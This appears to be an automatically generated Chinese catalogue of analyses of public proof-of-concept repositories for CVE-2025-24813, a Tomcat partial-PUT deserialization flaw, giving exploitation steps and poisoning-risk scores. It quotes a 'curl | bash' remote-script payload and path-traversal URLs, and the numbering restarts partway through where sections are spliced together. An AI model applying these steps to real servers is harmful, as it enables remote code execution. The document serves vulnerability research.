*   PoC代码首先尝试从多个URL下载ysoserial.jar，如果本地不存在。虽然这些URL都是公开的maven仓库或者github地址，但仍然存在被替换为恶意jar包的风险。 *   PoC代码在generate_payload函数中，使用了`subprocess.check_output`来执行java命令，生成payload。如果攻击者能够控制命令行的参数，就可以执行任意命令，进行投毒。
*   PoC代码在try_targets函数中, 尝试通过IP地址解析域名, 并以此进行攻击,可能会对目标网络造成干扰。

尽管存在上述风险，但主要功能符合漏洞利用逻辑，因此判断投毒风险较低。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 实例需要满足以下条件：
    *   Default Servlet 开启了写入功能（默认是关闭的，需要手动配置）。
    *   支持 Partial PUT（默认开启）。
    *   对于RCE，需要使用Tomcat的文件Session持久化机制，并且依赖中存在可被利用的反序列化库。
2.  **下载ysoserial：** PoC 首先会尝试下载 ysoserial.jar，用于生成反序列化 payload。
3.  **判断是否可写：** PoC 尝试在目标服务器上创建一个临时文件，以判断 Default Servlet 是否允许写入。
4.  **生成 Payload：** 使用 ysoserial，根据指定的 gadget 和命令，生成 Java 反序列化 payload。该命令默认使用`curl -fsSL {shell_url} | bash`从指定的`shell_url`下载shell脚本并执行，达到远程代码执行的目的。
5.  **上传 Payload：** 使用 partial PUT 方法，将生成的 payload 上传到 Tomcat session 存储目录。利用路径遍历漏洞，可以绕过一些安全限制。上传的文件名为 `{session_id}.session`。
6.  **触发 Payload：** 通过发送带有特定 Session ID 的 HTTP 请求，触发反序列化操作，从而执行恶意代码。

**总结：**

该漏洞的利用涉及多个步骤，需要目标环境满足一定的条件。PoC 代码通过利用 partial PUT 和路径遍历漏洞，结合 ysoserial 生成的 payload，最终实现远程代码执行。尽管存在一定的投毒风险，但总体来说，该 PoC 代码能够有效地利用 CVE-2025-24813 漏洞。

**项目地址:** [thebringerofdeath789/CVE-2025-24813](https://github.com/thebringerofdeath789/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #46

**来源**: [CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md](../2025/CVE-2025-24813-threadpoolx_CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价性漏洞/远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1-9.0.98, 10.1.0-M1-10.1.34, 11.0.0-M1-11.0.2

**利用条件:** 需要满足以下条件：默认Servlet的写入已启用（默认禁用）、支持部分PUT（默认启用）、应用程序使用Tomcat基于文件的会话持久性，默认存储位置、应用程序包含可在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞，源于对包含特殊字符（特别是分号“;”）的 URL 的解析不一致。这种不一致允许攻击者构造恶意 URL，该 URL 被安全检查组件和文件服务组件以不同的方式解释。如果启用了`default` servlet 的写权限和启用了`partial PUT`，并且使用了存在反序列化漏洞的依赖， 攻击者可以通过上传恶意文件（例如，JSP webshell），然后利用构造的包含 `..;/` 的 URL 来绕过安全限制，最终在服务器上实现远程代码执行(RCE)。

**有效性评估：**

根据漏洞描述和搜索结果，此漏洞已在野外被积极利用。漏洞利用代码中的 `README.md` 文件详细描述了漏洞原理、攻击链和利用方式，表明该 PoC 代码具备一定的有效性。

**投毒风险评估：**

分析了漏洞利用代码目录下的 `LICENSE` 和 `README.md` 文件，未发现明显的恶意代码。但任何 PoC 代码都存在潜在风险，不应在生产环境直接运行。 无法保证作者没有在其他文件中添加隐藏的后门代码。因此, 投毒风险评估为10%。

**漏洞利用方式：**

1.  **上传恶意 Payload：** 攻击者通过 Web 应用程序的文件上传功能，将恶意的 JSP Web Shell（例如 `shell.jsp`）上传到已知的非可执行目录，例如 `/uploads`。
2.  **发现Endpoint：** 攻击者识别服务器上一个合法的，可执行的 JSP 端点，例如 `/user/profile.jsp`。
3.  **构造和执行攻击URL：** 攻击者构造最终 URL，其中包含 `..;/` 序列来绕过安全检查。例如：`/app/user/..;/uploads/shell.jsp`。当服务器接收到此请求时，安全管理器可能只检查 `/app/user/` 的权限，而文件系统解析器会处理 `../` 并执行 `/uploads/shell.jsp` 中的代码。

**修复建议：**

*   升级到 Apache Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
*   禁用 default servlet 的写权限，除非绝对必要。
*   审查并更新应用程序依赖，移除存在反序列化漏洞的库。

**项目地址:** [threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat](https://github.com/threadpoolx/CVE-2025-24813-Remote-Code-Execution-in-Apache-Tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #47

**来源**: [CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-tonyarris_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：1. writes enabled for the default servlet (默认禁用); 2. 支持 partial PUT (默认启用); 3. 使用 Tomcat 的 file based session persistence 和默认存储位置; 4. 应用包含一个可能被用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 远程代码执行漏洞，利用了 Tomcat 处理部分 PUT 请求的方式。攻击者可以通过上传恶意构造的文件（利用 Ysoserial 生成反序列化 payload）到 Tomcat 服务器，然后通过 GET 请求触发反序列化，从而执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索引擎结果（Rapid7, GreyNoise, socprime 等）以及提供的 POC 代码，可以判断该漏洞是有效的，并且已经被观察到在野利用。POC 代码通过生成多种 Ysoserial payload 并尝试上传，增加了漏洞利用成功的概率。

**投毒风险分析：**

分析提供的 POC 代码，发现其主要功能是利用 ysoserial 生成反序列化 payload，然后通过 PUT 和 GET 请求触发漏洞。代码本身没有明显的恶意行为，例如向其他服务器发送信息或篡改本地文件。主要风险在于使用未经验证的第三方库（ysoserial），这本身可能存在安全风险，但是这是漏洞利用本身的一部分，而不是作者额外添加的恶意代码。

评估投毒风险较低，约为5%。

**利用方式：**

1.  **前提条件：** 目标 Tomcat 服务器需要满足特定配置条件，包括开启了 default servlet 的写入权限，支持 partial PUT，并且应用使用了 Tomcat 的文件会话持久化功能，且包含可被利用的反序列化库。
2.  **生成 Payload：** 使用 ysoserial 工具生成包含恶意命令的反序列化 payload。POC 代码支持批量生成不同 gadget chain 的 payload，提高成功率。
3.  **PUT 请求：** 通过 PUT 请求，将生成的 payload 分段上传到目标 Tomcat 服务器。利用 Content-Range 头部模拟 partial PUT 请求。
4.  **GET 请求：** 通过 GET 请求，触发 Tomcat 对上传文件的反序列化操作，从而执行恶意代码。
5.  **执行命令：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意命令。

**项目地址:** [tonyarris/CVE-2025-24813-PoC](https://github.com/tonyarris/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #48

**来源**: [CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md](../2025/CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入(disabled by default), 支持partial PUT(enabled by default), application 使用了Tomcat基于文件的session持久化，使用了默认的存储位置，并且application包含可被反序列化攻击利用的library。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，可能导致远程代码执行和/或信息泄露。该漏洞的根源在于对文件名的处理方式，特别是内部点（'file.Name'）。

**漏洞利用方式分析：**

根据漏洞库信息和搜索结果，该漏洞存在两种利用方式：

1.  **信息泄露/恶意内容注入：** 如果满足以下条件，攻击者能够查看敏感文件或注入恶意内容：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   目标URL是公共上传URL的子目录。
    *   攻击者知道敏感文件名。
    *   使用 partial PUT 上传敏感文件。

2.  **远程代码执行（RCE）：** 如果满足以下条件，攻击者能够执行任意代码：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   应用程序使用Tomcat的基于文件的session持久化，并使用默认存储位置。
    *   应用程序包含一个可以用于反序列化攻击的library。

**POC 代码分析：**

POC代码`CVE_2025_24813.py`实现了以下功能：

1.  **检查Servlet是否可写：** 使用PUT请求向目标URL上传文件，检查HTTP响应状态码，以确定服务器是否允许写入。
2.  **生成ysoserial payload：** 使用ysoserial工具生成反序列化payload，需要指定命令、ysoserial路径和gadget。
3.  **生成Java payload：**  生成一个简单的java文件, 然后通过javac编译为class文件, 再打包为jar文件。
4.  **上传和验证payload：** 上传生成的payload到Tomcat服务器, 利用路径穿越漏洞，覆盖session文件，从而执行代码。

**有效性评估：**

根据搜索结果，CVE-2025-24813漏洞正在被积极利用。POC代码涵盖了漏洞利用的关键步骤，包括写入性验证、payload生成和上传，因此可以认为是有效的，但利用成功与否取决于目标环境是否满足利用条件。

**投毒风险评估：**

通过分析POC代码，发现存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖外部工具ysoserial：**  POC代码依赖于ysoserial工具生成反序列化payload。虽然ysoserial是一个常用的漏洞利用工具，但如果用户下载了被篡改的ysoserial版本，可能会执行恶意代码。虽然POC本身没有直接植入恶意代码，但依赖的外部资源存在被投毒的风险。
2.  **执行任意命令：**  该脚本允许执行任意命令。如果攻击者控制了用户运行脚本的环境，可以修改脚本，执行恶意的系统命令，从而控制目标系统。

综合考虑，该POC代码的投毒风险较低，约为5%。大部分代码是用于漏洞利用，风险主要来源于对外部依赖的信任和对执行环境的控制。


**项目地址:** [u238/Tomcat-CVE_2025_24813](https://github.com/u238/Tomcat-CVE_2025_24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #49

**来源**: [CVE-2025-24813-uzairhaider502_CVE-2025-24813.md](../2025/CVE-2025-24813-uzairhaider502_CVE-2025-24813.md)

# CVE-2025-24813

> 📦 该CVE有 **52** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-24813-137f_Poc-CVE-2025-24813.md](../2025/CVE-2025-24813-137f_Poc-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 开启Partial PUT (默认开启), 应用使用基于文件的session持久化(默认位置), 应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，利用了路径等价性（内部点，例如 `file.Name`）结合启用了写入功能的默认 Servlet 和 Partial PUT 功能。该漏洞可能导致远程代码执行（RCE）、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用方式:**

1.  **前提条件:** 漏洞利用需要满足以下条件：
    *   默认 Servlet 开启写入 (disabled by default).
    *   支持 Partial PUT (enabled by default).
    *   对于RCE，应用需要使用 Tomcat 基于文件的 session 持久化，并且包含一个可以被反序列化攻击利用的库（例如，存在于classpath中的commons-collections）。
    *   对于信息泄露/文件篡改，需要攻击者了解敏感文件的上传目标 URL 位于公共上传目标 URL 的子目录下，且攻击者需要知道上传的敏感文件名，且敏感文件通过partial PUT上传。
2.  **漏洞利用步骤:**
    *   **获取 Session ID:** 攻击者首先需要获取一个有效的 JSESSIONID，可以通过访问 `/index.jsp` 获取，如果无法获取则使用默认值。
    *   **测试 PUT 方法:** 攻击者发送一个 PUT 请求来确认目标服务器是否允许使用 `Content-Range` 进行部分写入。
    *   **生成 Payload:**  攻击者使用 `ysoserial` 或者 Java 代码生成一个恶意的序列化对象。`ysoserial` 通过指定的 gadget（例如 `CommonsCollections6`）来执行命令。也可以生成一个包含恶意命令执行的Java .jar文件。
    *   **上传 Payload:**  攻击者利用路径遍历将 payload 上传到 Tomcat 的 session 目录。例如，`/uploads/../sessions/{JSESSIONID}.session`。
    *   **触发执行:**  攻击者使用包含恶意 JSESSIONID 的请求来访问应用程序。Tomcat 将会反序列化该 session 文件，从而执行攻击者注入的命令。

**有效性:**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞的 POC 代码**有效**。搜索结果中提到了该漏洞已被积极利用。提供的 POC 代码包含利用该漏洞进行 RCE 的 Python 脚本，并提供了详细的利用步骤和参数说明。

**投毒风险:**

评估提供的 POC 代码，投毒风险较低，约为 **10%**。主要考虑因素如下：

*   **代码结构:** 代码结构较为清晰，主要分为获取 Session ID、验证 PUT 方法、生成 Payload 和发送 Payload 等几个模块。
*   **依赖项:**  代码依赖 `ysoserial.jar`，这本身是一个已知的漏洞利用工具，如果攻击者替换了 `ysoserial.jar` 文件，则可能引入恶意代码。此外，java payload方式需要服务器具有java编译环境。
*   **潜在风险:**  `java_payload` 函数中使用 `Runtime.getRuntime().exec(c)` 直接执行命令，如果命令字符串 `cmd` 构造不当，可能会存在命令注入的风险。
*   **作者声明:**  README 文件中包含免责声明，说明该代码仅用于教育目的，这在一定程度上降低了作者进行恶意投毒的可能性。

总的来说，虽然代码本身看起来没有明显的恶意行为，但仍然需要谨慎使用，并确保从可信的来源获取 `ysoserial.jar`，并仔细检查命令字符串，避免引入额外的安全风险。 java payload方式需要服务器具有java编译环境,具有一定局限性。

**项目地址:** [137f/Poc-CVE-2025-24813](https://github.com/137f/Poc-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #2

**来源**: [CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露，文件被篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足特定配置条件，包括启用Default Servlet的写入功能，启用partial PUT支持，存在安全敏感文件上传的目标URL位于公共上传目标URL的子目录中，攻击者已知安全敏感文件的名称，以及安全敏感文件通过partial PUT上传。或者，启用Default Servlet的写入功能，启用partial PUT支持，应用程序使用Tomcat基于文件的会话持久性与默认存储位置，应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息，CVE-2025-24813 涉及 Apache Tomcat 的路径等效问题，可能导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。利用条件包括Default Servlet启用了写入，支持partial PUT，以及应用程序的特定配置。搜索引擎结果显示，该漏洞已被公开并被积极利用。

提供的 POC 代码尝试利用该漏洞。它首先使用 `argparse` 处理目标 URL 参数。然后，它包含一段 base64 编码的 payload，该 payload 是一个经过序列化的 Java 对象，旨在执行命令 `touch /tmp/RCE-success`。  该脚本将解码后的payload保存到`decoded_chain.bin`文件中。 然后，使用 `requests.put` 函数，通过构造包含 'Content-Range' 头部的 PUT 请求，利用 Tomcat 的 partial PUT 功能，将payload上传到目标服务器。PUT请求的目标URL是`TARGET_IP/payload.session`。脚本上传完成后删除临时文件。 最后使用Cookie进行getSession。

**有效性评估：** POC 的有效性取决于目标 Tomcat 服务器是否满足漏洞利用的全部条件。如果 Default Servlet 的写入已启用，并且启用了 partial PUT 支持，并且满足其他条件，则 POC 可能有效。

**投毒风险评估：** 仔细检查提供的 POC 代码，没有发现明显的投毒代码。该代码旨在利用已知的 Tomcat 漏洞，而不是在目标系统上植入后门或执行恶意操作。 代码中包含的base64编码的payload部分是最有可能存在风险的部分，但是payload中的命令是`touch /tmp/RCE-success`，该命令仅仅是创建一个文件，用于验证漏洞是否存在，并非恶意操作。

**利用方式总结：**

1.  **条件确认:** 确认目标 Tomcat 服务器启用了 Default Servlet 的写入功能，并启用了 partial PUT 支持，以及是否满足其他相关条件。
2.  **Payload 生成:**  生成一个恶意 Java 序列化对象，该对象可以执行任意代码，或者读取敏感文件。
3.  **Partial PUT 上传:**  使用 HTTP PUT 请求，通过设置 `Content-Range` 头部，将恶意 payload 分块上传到目标服务器上的特定路径（例如，`payload.session`）。
4.  **触发反序列化：**  Tomcat 尝试反序列化上传的文件，从而触发恶意代码的执行。


**项目地址:** [Alaatk/CVE-2025-24813-POC](https://github.com/Alaatk/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #3

**来源**: [CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md](../2025/CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：默认Servlet开启写入 (默认关闭)，支持Partial PUT (默认开启)，存在安全敏感文件的目标URL是公共上传目标URL的子目录，攻击者知晓敏感文件名，安全敏感文件通过Partial PUT上传，或应用程序使用Tomcat文件会话持久性（默认位置），应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞。该漏洞允许攻击者通过精心构造的包含内部点（file.Name）的文件名，利用默认Servlet中启用的写入功能和Partial PUT支持，进行远程代码执行、信息泄露和恶意内容注入。根据漏洞描述，攻击成功的关键在于Tomcat的配置以及应用程序是否使用了易受攻击的组件。

**有效性：** 从搜索结果来看，该漏洞已被确认存在并且有在野利用。但是，漏洞利用需要满足多个非默认配置条件，因此并非所有Tomcat实例都易受攻击。提供的POC代码 `/tmp/9a20e2370d216dc00af3f4d6145c600e/README.md` 内容过于简单，仅包含CVE编号，并不能直接用于漏洞利用，需要根据具体情况编写特定的利用代码，例如构造恶意的PUT请求。

**投毒风险：** 提供的POC代码非常简单，主要就是包含 CVE-2025-24813 的 README.md 文件。因此，投毒风险很低，但是不排除作者在其他相关文件中隐藏恶意代码的可能性，只是没有在此次提交中呈现，考虑到文件数量极少,故判断存在10%的投毒风险。

**利用方式：** 漏洞利用主要通过以下步骤：

1.  **利用Partial PUT上传恶意文件：** 攻击者构造包含内部点的文件名，并通过Partial PUT请求将其上传到目标服务器。
2.  **绕过路径检查：** 由于路径等价性问题，Tomcat可能无法正确处理包含内部点的文件名，导致绕过路径检查。
3.  **信息泄露/恶意内容注入：** 如果目标是信息泄露或恶意内容注入，攻击者需要知道目标敏感文件的名称和路径，然后通过覆盖或修改该文件来实现目的。
4.  **远程代码执行：** 如果应用程序使用了Tomcat的文件会话持久性，并且包含可用于反序列化攻击的库，攻击者可以利用该漏洞将恶意序列化对象写入会话文件，从而实现远程代码执行。攻击者可能会覆盖session文件，然后触发反序列化。

**总结：** CVE-2025-24813 是一个高危漏洞，但是利用条件较为苛刻。 提供的POC代码过于简单，无法直接用于攻击，需要根据目标环境进行定制。在实际环境中，需要仔细评估Tomcat的配置和应用程序的安全性，以确定是否存在被利用的风险。同时需要关注针对该漏洞的攻击尝试并及时采取缓解措施，例如禁用默认Servlet的写入功能或升级到修复版本。

**项目地址:** [AlperenY-cs/CVE-2025-24813](https://github.com/AlperenY-cs/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #4

**来源**: [CVE-2025-24813-AsaL1n_CVE-2025-24813.md](../2025/CVE-2025-24813-AsaL1n_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危 (取决于配置和利用方式，可能导致RCE、敏感信息泄露或文件内容篡改)

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** RCE需要满足以下条件：writes enabled for default servlet, support for partial PUT, 使用Tomcat文件session持久化默认位置, 应用包含可被反序列化攻击利用的库。信息泄露/内容篡改需要满足以下条件：writes enabled for default servlet, support for partial PUT, security sensitive上传URL是公共上传URL的子目录, 攻击者知道security sensitive文件的名字, security sensitive文件也是通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是一个Apache Tomcat中的路径等价性漏洞，源于对文件名中内部点（'file.Name'）处理不当。根据漏洞描述和搜索结果，此漏洞在特定配置下可能导致远程代码执行（RCE）、信息泄露或恶意内容被添加到上传文件中。

**有效性：**
根据搜索引擎结果和漏洞描述，该漏洞已被积极利用。提供的PoC代码利用了Tomcat的partial PUT特性以及session持久化机制（在满足一定条件下），尝试通过上传恶意序列化数据来实现RCE。

**利用方式：**
1.  **前提条件：**
    *   Tomcat的default servlet需要开启写入功能（默认关闭）。
    *   需要启用partial PUT支持（默认开启）。
    *   （RCE）应用使用Tomcat的文件session持久化，且为默认存储位置。
    *   （RCE）应用包含可被反序列化攻击利用的库，例如存在fastjson, jackson等。
    *   （信息泄露/内容篡改）存在安全敏感文件上传URL是公共上传URL的子目录， 且攻击者知道该敏感文件名。
2.  **攻击步骤：**
    *   攻击者构造一个恶意的序列化对象，对其进行Base64编码（PoC中`-d/--data` 参数）。
    *   攻击者指定目标URL（PoC中`-u/--url` 参数）。
    *   PoC脚本首先向目标URL发送PUT请求，其中`Content-Range`头指定了上传的范围，利用Tomcat的partial PUT特性。
    *   如果服务器返回409状态码，则表示partial PUT已成功处理。
    *   之后，PoC脚本会发送GET请求，并携带包含恶意序列化数据的JSESSIONID cookie（`.{random_str}`）。
    *   Tomcat反序列化session数据，从而触发RCE (如果满足RCE条件)。

**投毒风险：**
分析提供的PoC代码和Readme，可以发现：
*   脚本本身的功能是利用漏洞进行攻击。
*   脚本中没有发现明显的恶意代码，例如植入后门、篡改系统文件等。
*   脚本需要用户提供Base64编码的序列化数据，这意味着攻击者需要自行生成payload，脚本只是负责发送payload。
*   Readme中指明了利用方式及所需条件，较为详细。

因此，该仓库中存在作者隐藏的恶意代码的可能性较低，但不能完全排除。投毒风险评估为 10%。风险主要在于用户可能下载了被篡改过的poc，或者运行了来历不明的payload, 这些payload可能包含恶意行为。

**项目地址:** [AsaL1n/CVE-2025-24813](https://github.com/AsaL1n/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #5

**来源**: [CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露和文件被恶意修改

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (Tomcat 默认支持), 文件会话持久化启用 (context.xml 配置 PersistentManager 和 FileStore), 存在反序列化利用链 (类路径下包含存在漏洞的库)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，该漏洞源于 'file.Name' (内部点) 的处理不当。如果满足以下所有条件，则可能导致远程代码执行，信息泄露或文件篡改：

1.  **DefaultServlet 写入功能启用：** 必须在 `web.xml` 中配置 `readonly=false`，允许 DefaultServlet 写入文件。
2.  **Partial PUT 请求支持：** Tomcat 默认支持分块上传，允许攻击者通过分块上传恶意文件。
3.  **文件会话持久化启用：** 需要在 `context.xml` 中配置 `PersistentManager` 和 `FileStore`，启用基于文件的会话存储。
4.  **存在反序列化利用链：** 类路径下需要包含存在漏洞的库（例如，`commons-collections-3.2.1.jar`），使得攻击者可以通过反序列化漏洞执行任意代码。
5.  **信息泄露/文件篡改的先决条件:** 除了上述条件外，还需要满足：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**利用方式：**

1.  攻击者首先利用 Partial PUT 请求上传一个恶意构造的序列化对象，该对象包含一个反序列化利用链（例如，使用 Commons Collections）。
2.  由于启用了 DefaultServlet 的写入功能，恶意文件可以被写入到 Tomcat 的会话存储目录中。
3.  当 Tomcat 尝试反序列化该会话时，由于存在利用链，攻击者可以执行任意代码。
4. 若目标满足信息泄露/文件篡改的先决条件,攻击者可以通过构造恶意的Partial PUT请求，利用路径等价绕过限制，最终实现信息泄露或者文件篡改

**投毒风险分析：**

该POC代码提供了一个 Docker Compose 文件，用于搭建易受攻击的 Tomcat 环境。该环境配置了必要的组件（DefaultServlet 写入，Partial PUT，文件会话持久化），并且包含了一个 Commons Collections 库，可以用于反序列化攻击。

代码本身看起来是直接了当的漏洞演示。投毒风险较低，但是使用该POC时仍需注意。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的利用代码来看，该漏洞已经确认被利用，并且相关的利用方式和利用条件已经比较清晰。提供的POC代码针对的是 RCE 部分，有效性较高，但成功利用取决于是否满足所有前提条件。

**项目地址:** [B1gN0Se/Tomcat-CVE-2025-24813](https://github.com/B1gN0Se/Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #6

**来源**: [CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence/Partial PUT RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/Partial PUT远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet启用写入(默认禁用)，启用Partial PUT(默认启用)，目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且通过Partial PUT上传敏感文件。RCE还需要应用程序使用Tomcat的文件会话持久性，以及存在可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合启用了写入功能的默认Servlet和Partial PUT功能，可能导致远程代码执行和敏感信息泄露。漏洞利用方式如下：

1.  **信息泄露/内容注入:** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   目标URL是公共上传URL的子目录
    *   攻击者知道敏感文件名
    *   通过Partial PUT上传敏感文件
攻击者可以查看敏感文件或向其中注入恶意内容。

2.  **远程代码执行 (RCE):** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   应用程序使用Tomcat的文件会话持久性，且使用默认存储位置
    *   应用程序包含可利用的反序列化库
攻击者可以通过上传恶意序列化session文件，利用反序列化漏洞执行任意代码。

**有效性：**
根据搜索结果，CVE-2025-24813漏洞存在活跃的利用。PoC代码的README描述了一个基本的利用流程，包括克隆仓库、安装依赖、运行PoC脚本，表明该PoC可能有效，但具体利用成功与否取决于目标环境的配置是否满足漏洞利用条件。PoC的有效性较高，因为搜索结果显示该漏洞正在被积极利用。

**投毒风险：**
分析提供的PoC代码（README.md），投毒风险较低。README.md文件只包含漏洞描述、环境配置、使用方法和免责声明。虽然PoC代码没有直接展示`poc.py`的内容，但是根据描述`poc.py`脚本会提示用户输入目标URL，表明其功能是针对目标进行漏洞验证而非植入后门。当然，`poc.py`本身可能包含恶意代码。在没有查看 `poc.py` 的内容的情况下，预估`poc.py`存在投毒代码的可能性较低，大约10%。主要考虑到以下几点：

*   PoC旨在验证漏洞的存在，而非长期控制目标系统。
*   公开的PoC代码通常会接受安全社区的审查，增加投毒的难度。
*   作者声明仅用于教育和研究目的。

**利用方式总结：**
